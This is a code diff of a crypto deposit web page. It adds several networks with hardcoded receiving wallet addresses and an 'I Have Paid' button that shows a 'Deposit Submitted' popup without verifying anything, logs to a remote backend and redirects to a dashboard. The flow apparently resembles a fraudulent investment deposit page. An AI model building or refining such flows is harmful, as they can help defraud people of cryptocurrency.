@@ -15,7 +15,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
         
         .gateway-container { width: 100%; max-width: 420px; background-color: #0d1117; border-radius: 24px; border: 1px solid #21262d; padding: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); position: relative; }
         
@@ -46,6 +46,15 @@
         .action-submit-btn { width: 100%; padding: 16px; background-color: #238636; border: none; color: #fff; border-radius: 14px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; transition: background 0.2s; }
         .action-submit-btn:hover { background-color: #2ea043; }
         .action-submit-btn:disabled { background-color: #21262d; color: #8b949e; cursor: not-allowed; }
+
+        /* Dynamic Popup Structural Matrix Overlay */
+        .success-popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 14, 20, 0.85); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+        .success-popup-overlay.active { opacity: 1; pointer-events: auto; }
+        .popup-card { background: #0d1117; border: 1px solid #30363d; width: 90%; max-width: 340px; padding: 32px 24px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.6); transform: scale(0.85); transition: transform 0.3s ease; }
+        .success-popup-overlay.active .popup-card { transform: scale(1); }
+        .popup-icon-wrapper { width: 64px; height: 64px; background: rgba(35, 134, 54, 0.15); border: 2px solid #238636; color: #2ea043; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 28px; margin: 0 auto 16px auto; }
+        .popup-card h3 { font-size: 20px; font-weight: 700; margin-bottom: 8px; color: #fff; }
+        .popup-card p { font-size: 13px; color: #8b949e; line-height: 1.5; }
     </style>
 </head>
 <body>
@@ -56,14 +65,17 @@
         <h2>Crypto Deposit Gateway</h2>
     </div>
 
-    <!-- Network Selector Component -->
+    <!-- Re-engineered Network Component Selector Stack -->
     <div class="form-group">
-        <label class="form-label">Select Asset / Network</label>
+        <label class="form-label">Select Payment Asset / Network</label>
         <select id="assetNetworkSelector" class="select-input" onchange="handleNetworkSwitchAction()">
             <option value="BTC">Bitcoin (BTC)</option>
             <option value="BNB">BNB (BEP-20)</option>
+            <option value="SOL">Solana (SOL)</option>
+            <option value="TRX">Tron (TRC-20)</option>
             <option value="TON">Ton (TON)</option>
             <option value="SUI">Sui (SUI)</option>
+            <option value="ETH">Ethereum (ERC-20)</option>
         </select>
     </div>
 
@@ -73,7 +85,7 @@
 
     <div class="meta-info-row">
         <div class="network-lbl">Active Network Node</div>
-        <div class="network-val" id="networkDisplayLabel"><i class="fa-brands fa-bitcoin"></i> Bitcoin (BTC)</div>
+        <div class="network-val" id="networkDisplayLabel"></div>
     </div>
 
     <div class="copy-input-group">
@@ -86,17 +98,28 @@
         <input type="text" id="fundingAmountDisplay" class="amount-display-field" readonly>
     </div>
 
+    <!-- Primary Action Trigger Button Reconfigured -->
     <button class="action-submit-btn" id="confirmTransferBtn" onclick="executeNetworkConfirmationRoute()">
-        <i class="fa-solid fa-circle-check"></i> Confirm Network Transfer
+        <i class="fa-solid fa-money-bill-wave"></i> I Have Paid
     </button>
+</div>
+
+<!-- Immersive Popup Overlay Component -->
+<div id="successModalOverlay" class="success-popup-overlay">
+    <div class="popup-card">
+        <div class="popup-icon-wrapper">
+            <i class="fa-solid fa-check"></i>
+        </div>
+        <h3>Deposit Submitted</h3>
+        <p>Your network payment notification has been logged. Syncing wallet status, please wait...</p>
+    </div>
 </div>
 
 <script>
     const API_BASE_URL = 'https://tesloiq.onrender.com/api';
     let loadedTransferAmountValue = 0;
-    let hasCopiedAddress = false;
 
-    // Unified Encapsulated Repository for Wallet Target Infrastructure
+    // Comprehensive Cryptographic Target Infrastructure Registry
     const WALLET_ECOSYSTEM_REGISTRY = {
         BTC: {
             label: '<i class="fa-brands fa-bitcoin"></i> Bitcoin (BTC)',
@@ -108,6 +131,16 @@
             address: '0xcf9CF6cC3A8F314999c9d2ba1136cB07255eFf0B',
             qrPrefix: ''
         },
+        SOL: {
+            label: '<i class="fa-solid fa-cube"></i> Solana (SOL)',
+            address: 'Bw3p4QqmNUKK19hqJXABZXrG3Z5ryAqHs1mLrdn1986g',
+            qrPrefix: 'solana:'
+        },
+        TRX: {
+            label: '<i class="fa-solid fa-shield-halved"></i> Tron (TRC 20)',
+            address: 'TNWjENWFiEhrEnwywLZL2y9Lw4S7WZj2dm',
+            qrPrefix: ''
+        },
         TON: {
             label: '<i class="fa-solid fa-diamond"></i> Ton (TON)',
             address: 'UQBDFLB35M7QZtcYF7FW9aaF44sd7iLHlauVdyUAafp9SXQq',
@@ -117,12 +150,17 @@
             label: '<i class="fa-solid fa-droplet"></i> Sui (SUI)',
             address: '0x7ab9b39eee123c5c2c035ee221ed77489957169448657c571ad2151a4991d341',
             qrPrefix: ''
+        },
+        ETH: {
+            label: '<i class="fa-brands fa-ethereum"></i> Eth (ERC 20)',
+            address: '0xcf9CF6cC3A8F314999c9d2ba1136cB07255eFf0B',
+            qrPrefix: 'ethereum:'
         }
     };
 
     window.addEventListener('DOMContentLoaded', () => {
         extractDashboardAllocationContext();
-        handleNetworkSwitchAction(); // Boot with initial tracking calculations
+        handleNetworkSwitchAction(); 
     });
 
     function extractDashboardAllocationContext() {
@@ -144,17 +182,11 @@
         const chosenNetworkKey = document.getElementById('assetNetworkSelector').value;
         const targetConfig = WALLET_ECOSYSTEM_REGISTRY[chosenNetworkKey];
         
-        // Dynamic Node Mapping Realignment
         document.getElementById('networkDisplayLabel').innerHTML = targetConfig.label;
         document.getElementById('walletAddressNode').value = targetConfig.address;
         
-        // Re-render Dynamic QR Data
         const encodedDataParam = encodeURIComponent(targetConfig.qrPrefix + targetConfig.address);
         document.getElementById('qrTargetImageNode').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedDataParam}`;
-        
-        // Reset interactive state back to clean defaults if user switches active network configurations
-        hasCopiedAddress = false;
-        document.getElementById('confirmTransferBtn').innerHTML = `<i class="fa-solid fa-circle-check"></i> Confirm Network Transfer`;
     }
 
     function copyWalletAddressToClipboard() {
@@ -168,10 +200,6 @@
         copyLabelBtn.style.background = '#238636';
         copyLabelBtn.style.color = '#fff';
 
-        hasCopiedAddress = true;
-        const actionButton = document.getElementById('confirmTransferBtn');
-        actionButton.innerHTML = `<i class="fa-solid fa-money-bill-wave"></i> I Have Paid`;
-
         setTimeout(() => {
             copyLabelBtn.innerText = 'Copy';
             copyLabelBtn.style.background = '#21262d';
@@ -184,7 +212,10 @@
         const chosenNetworkKey = document.getElementById('assetNetworkSelector').value;
         
         interactiveSubmitBtn.disabled = true;
-        interactiveSubmitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Confirming with Network (2s)...`;
+
+        // Display Success Modal Layout seamlessly 
+        const modalOverlay = document.getElementById('successModalOverlay');
+        modalOverlay.classList.add('active');
 
         const syncBackendData = async () => {
             try {
@@ -199,14 +230,14 @@
                     })
                 });
             } catch (err) {
-                console.error("Silent background check sync anomaly:", err);
+                console.error("Background data logging error exception:", err);
             }
         };
 
-        // Fire off backend record creation pipeline asynchronously
+        // Fire asynchronous background database update execution routing
         syncBackendData();
 
-        // Enforce the explicit 2-second wait state before window redirection
+        // Hold success popup visibility open for exactly 2000ms before returning tracking contexts to dashboard
         setTimeout(() => {
             localStorage.removeItem('customDepositAmount');
             window.location.href = './dashboard.html';
